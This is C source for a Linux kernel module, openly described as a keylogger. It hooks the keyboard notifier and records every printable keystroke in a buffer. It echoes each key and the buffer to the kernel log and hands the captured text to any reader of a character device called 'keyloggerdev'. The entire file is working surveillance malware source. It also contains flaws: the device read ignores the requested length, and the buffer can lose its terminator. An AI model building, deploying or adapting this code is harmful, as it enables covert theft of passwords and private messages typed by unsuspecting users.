#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>

/*

	Config

*/

#define OK NOTIFY_OK
#define NUM_DEV 1
#define BUFFER_SIZE 1024

MODULE_LICENSE("GPL");
MODULE_AUTHOR("James Taintor");
MODULE_DESCRIPTION("KeyLogger");
MODULE_VERSION("0.1");

/*

	Prototypes

*/

int listener(struct notifier_block *, unsigned long , void *);
static int open(struct inode *, struct file *);
static ssize_t read(struct file *, char __user *, size_t , loff_t *);
static int release(struct inode *inode, struct file *file);

/*

	Global Vars

*/

static struct notifier_block notifBlock = {
	.notifier_call = listener
};

static const struct file_operations operations = {
    .owner      = THIS_MODULE,
    .open       = open,
    .read       = read,
	.release    = release,
};

struct CDD { // char device data
    struct cdev cdev;
};

static int major = 0;
static struct class *charDevClass = NULL;
static struct CDD deviceData[NUM_DEV];
static char buffer[BUFFER_SIZE];
static int position = 0; // keep track of buffer position to avoid overflow

/*

	Methods

*/

int listener(struct notifier_block *notif_block, unsigned long act, void *data){

	struct keyboard_notifier_param *kbdNotifParam = data; // cast data to notification structure

	int down = kbdNotifParam->down; // let us know if the user is pressing down or lifting up key

	int keysym = (act == KBD_KEYSYM); // check if we are the the keysym event notifier

	if(keysym && down){

		char c = kbdNotifParam->value; // get the char that was pressed

		if(c >= 32 && c <= 126){
			printk(KERN_INFO "Key: %c\n", c);
			buffer[position] = c;
			position++;
			printk(KERN_INFO "Buffer: %s\n", buffer);
		}

		if(position >= BUFFER_SIZE){
			position = 0;
			memset(buffer, 0, BUFFER_SIZE);
			
		}

	}

	return OK;

}

static ssize_t read(struct file *file, char __user *usr_buffer, size_t count, loff_t *offset){
    
	printk(KERN_INFO "Key Logger: Reading Device...\n");

	size_t length = strlen(buffer);

	int result = copy_to_user(usr_buffer, buffer, length);

	if (result) {
		printk(KERN_INFO "Couldn't copy all data to user space\n");
		return result;
	}

	position = 0;
	memset(buffer, 0, BUFFER_SIZE);

	return length;

}

static int open(struct inode *inode, struct file *file){
    printk(KERN_INFO "Key Logger: Open Device...\n");
    return 0;
}

static int release(struct inode *inode, struct file *file){
    printk(KERN_INFO "Key Logger: Closing Device...\n");
    return 0;
}

static int __init keylog_start (void){

	// vars
	
	int error;
	dev_t device;

	//starting setup

	printk(KERN_INFO "Key Logger: Initializing...\n");

	//setup device

	error = alloc_chrdev_region(&device, 0, NUM_DEV, "keyloggerdev");

	major = MAJOR(device);

	charDevClass = class_create(THIS_MODULE, "keyloggerdev");

	cdev_init(&deviceData[0].cdev, &operations);

	deviceData[0].cdev.owner = THIS_MODULE;

	cdev_add(&deviceData[0].cdev, MKDEV(major, 0), 1);

	device_create(charDevClass, NULL, MKDEV(major, 0), NULL, "keyloggerdev-%d", 0);

	//register listener for notification hook
	register_keyboard_notifier(&notifBlock);

	//clear buffer memory
	memset(buffer, 0, BUFFER_SIZE);

	printk(KERN_INFO "Key Logger: Successfully Started...\n");

	return 0;

}

static void __exit keylog_end(void){
	
	printk(KERN_INFO "Key Logger: Shutting Down...\n");
	
	//destroy device

	device_destroy(charDevClass, MKDEV(major, 0));
	class_unregister(charDevClass);
	class_destroy(charDevClass);

	unregister_chrdev_region(MKDEV(major, 0), MINORMASK);

	//unregister listener
	unregister_keyboard_notifier(&notifBlock);

	printk(KERN_INFO "Key Logger: Goodbye :-)...\n");

}

/*

	Config

*/

module_init(keylog_start);
module_exit(keylog_end);
